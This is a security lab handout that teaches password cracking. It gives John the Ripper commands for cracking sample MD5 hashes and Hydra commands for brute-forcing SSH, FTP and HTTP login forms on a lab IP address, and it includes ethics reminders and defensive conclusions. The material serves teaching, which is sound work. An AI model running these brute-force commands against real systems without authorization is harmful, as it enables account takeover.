**1. Aim:** To demonstrate and understand password cracking techniques using professional penetration testing tools, exploring the mechanisms of password vulnerability and the importance of robust password security.

**2. Learning Objectives**

- Understand the principles behind password cracking techniques - Gain hands-on experience with professional security assessment tools
- Analyze password strength and common vulnerabilities
- Develop insights into implementing stronger authentication mechanisms

**3. Theory**

**Password Cracking Techniques**

**Password cracking involves attempting to discover or bypass authentication credentials through various methodologies:**

**Types of Password Cracking Methods**

1. **Brute Force Attack**
   - Systematically attempting all possible password combinations
   - Most time-consuming but potentially most comprehensive method
   - Effectiveness depends on password complexity
2. **Dictionary Attack**
   - Uses pre-compiled lists of common passwords
   - Leverages human tendency to use predictable password patterns
   - Significantly faster than pure brute force approaches
3. **Hybrid Attacks**
   - Combines dictionary words with numerical or symbolic modifications
   - Accounts for common password complexity requirements

**Tools Overview**

1. **John the Ripper**
   - Open-source password cracking tool
   - Supports multiple password hash formats
   - Can perform dictionary and brute force attacks
2. **Hydra**
   - Network logon cracker
   - Supports multiple protocols (HTTP, FTP, TELNET, etc.)
   - Allows parallel testing of multiple password candidates

**Ethical Considerations**

- Only perform password cracking on systems you own or have explicit permission to test
- Unauthorized password cracking is illegal and unethical
- Always obtain written consent before conducting security assessments

**3. Experimental Commands:**

#### John the Ripper:

**Installation**
```shell
sudo apt install john
```
```shell
sudo apt install libssl-dev libcrypto++-dev
```

**Generate MD5 Hashes using this command in the terminal:**

```shell
echo -n "password123" | md5sum
echo -n "hello123"    | md5sum
echo -n "admin"       | md5sum
echo -n "welcome"     | md5sum
```

**Create `hashes.txt` with those hashes**

```shell
echo "482c811da5d5b4bc6d497ffa98491e38" > hashes.txt
echo "49f68a5c8493ec2c0bf489821c21fc3b" >> hashes.txt
echo "21232f297a57a5a743894a0e4a801fc3" >> hashes.txt
echo "b4b147bc522828731f1a016bfa72c073" >> hashes.txt
```

```shell
sudo apt install hashcat
```

**Run John the Ripper**
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```
*If `rockyou.txt` compressed (as `.gz`), extract it:*
```shell
gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Show Cracked Passwords**
```shell
john --show --format=Raw-MD5 hashes.txt 
```

#### Hydra

**Open Your Terminal**

Kali Linux comes with Hydra pre-installed. If not:
```bash
sudo apt update
sudo apt install hydra
```

**Know the Basic Syntax**
```bash
hydra -L <usernames_file> -P <passwords_file> <target> <service>
```
- `-L` = file with usernames
- `-P` = file with passwords
- `<target>` = target machine
- `<service>` = service (ssh, ftp, http, etc.)

 **Example Attack on SSH**

Let's say your target IP is 192.168.1.100, and you can create using `nano` as `.txt` files:
- `users.txt` → list of usernames
- `pass.txt` → list of passwords


**Brute-forcing the SSH login**
```bash
hydra -L users.txt -P pass.txt ssh://192.168.1.100
```

**FTP Attack Example**
```bash
hydra -L users.txt -P pass.txt ftp://192.168.1.100
```

**HTTP POST Form Example**

If you're attacking a web login (HTTP POST form), you need the parameters:

```bash
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
```

- `/login.php` is the login path
- `user=^USER^&pass=^PASS^` is the POST data
- `Invalid credentials` is the failure string on a bad login

**Save the Output**
You can log the output like this:
```bash
hydra -L users.txt -P pass.txt ssh://192.168.1.100 -o found.txt
```

**5. Learning Outcomes**

_After completing this experiment, students will:_

- Understand password cracking methodologies
- Recognize common password vulnerabilities
- Develop skills in using professional security assessment tools
- Appreciate the importance of complex password design

**6. Conclusion**

Password security is a critical aspect of cybersecurity. This experiment demonstrates the ease with which weak passwords can be compromised, emphasizing the need for:

- Complex, unique passwords
- Multi-factor authentication
- Regular password rotation
- Advanced authentication mechanisms
